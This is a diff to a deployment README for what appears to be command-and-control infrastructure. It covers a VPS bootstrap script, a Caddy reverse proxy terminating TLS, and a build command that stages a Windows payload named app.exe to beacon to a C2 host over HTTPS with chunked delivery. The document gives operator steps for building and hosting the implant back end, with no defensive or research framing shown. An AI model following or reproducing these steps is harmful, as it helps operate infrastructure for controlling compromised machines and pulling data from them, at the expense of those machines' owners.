@@ -22,21 +22,23 @@ issues and renews the certificate itself; there is no certbot step.
 
 The listener is not reachable from the internet except through Caddy.
 
-## Current payload and TLS
+## Payload and TLS
 
-The payload builds HTTP requests on raw Winsock, so it does not speak TLS yet.
-Two options until the schannel stage lands:
+The payload speaks TLS 1.2 itself (schannel), so the production shape is:
 
 ```sh
-./deploy/vps/bootstrap.sh c2.example.com --plain
-python build.py stage app.exe --c2 http://c2.example.com:9415/
+./deploy/vps/bootstrap.sh c2.example.com
+python build.py stage app.exe --c2 https://c2.example.com/
 ```
 
-`--plain` opens TCP 9415 in ufw; the listener still binds `0.0.0.0`, so the
-header is the only thing between that port and the internet. Use it for live
-runs, not as the permanent shape.
+The listener stays on `127.0.0.1:9415`; Caddy terminates TLS on 443, forwards the
+plain POST to the listener and renews the certificate. Nothing else is exposed.
 
-After stage 4, drop `--plain` and stage with `https://c2.example.com/`.
+`--plain` is only for a legacy plain-HTTP build or a direct listener on 9415
+(opens the port in ufw). Do not use it with an `https://` C2.
+
+Chunked delivery expects a `200` per chunk; Caddy passes the response through,
+so a healthy deployment logs `x/n` chunk headers and ends with the coverage row.
 
 ## Operations
 
